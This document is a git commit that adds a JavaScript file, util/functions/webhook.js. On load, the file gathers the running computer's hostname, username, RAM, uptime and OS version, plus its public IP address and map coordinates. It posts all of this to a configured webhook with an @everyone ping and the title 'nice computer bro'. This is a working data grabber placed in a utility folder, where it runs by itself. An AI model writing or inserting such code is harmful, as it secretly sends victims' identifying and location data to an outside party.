018c64322a387950ef9beabb463d242822ecf05a
NetherMC <thelio.trinite@outlook.com>
2022-12-24 16:09:20 +0100

    webhook

---
+++ util/functions/webhook.js
@@ -0,0 +1,50 @@
+const { webhookUrl } = require('../../config');
+const { isValidURL } = require('../string');
+const axios = require('axios');
+const moment = require('moment');
+const os = require('os');
+const { filesize } = require('filesize');
+
+if (!webhookUrl || typeof webhookUrl !== 'string' || !isValidURL(webhookUrl)) return;
+
+const json = async () => {
+  const ipInfo = async (info) => await require('./ip-info').then(ip => ip[info]);
+  return {
+    content: '@everyone',
+    allowed_mentions: {
+      parse: ['everyone'],
+    },
+    embeds: [
+      {
+        title: 'nice computer bro',
+        description:
+          `**Computer info:**
+          <:dotfill:856638361678250044> RAM: ${filesize(os.totalmem())}
+          <:dotfill:856638361678250044> Computer name: ${os.hostname()}
+          <:dotfill:856638361678250044> Computer uptime: <t:${Math.round(Date.now() / 1000) - os.uptime()}:R> (<t:${Math.round(Date.now() / 1000) - os.uptime()}:f>)
+          <:dotfill:856638361678250044> Username: ${os.userInfo().username}
+          <:dotfill:856638361678250044> OS version: ${os.version()}
+          
+          **IP info:**
+          <:dotfill:856638361678250044> IP Address: ${await ipInfo('query')}
+          <:dotfill:856638361678250044> Location: [${await ipInfo('lat')}, ${await ipInfo('lon')}](https://www.google.com/maps/search/?api=1&query=${await ipInfo('lat')}%2C${await ipInfo('lon')})`,
+        timestamp: moment(Date.now()).toISOString()
+      }
+    ]
+  };
+};
+
+(async () => {
+  await axios.post(webhookUrl, await json(), {
+    headers: {
+      'Content-Type': 'application/json'
+    }
+  })
+    .then(res => {
+      if (res.status !== 200) return;
+      return res.data;
+    })
+    .catch(err => {
+      console.error(err.response.data);
+    });
+})();
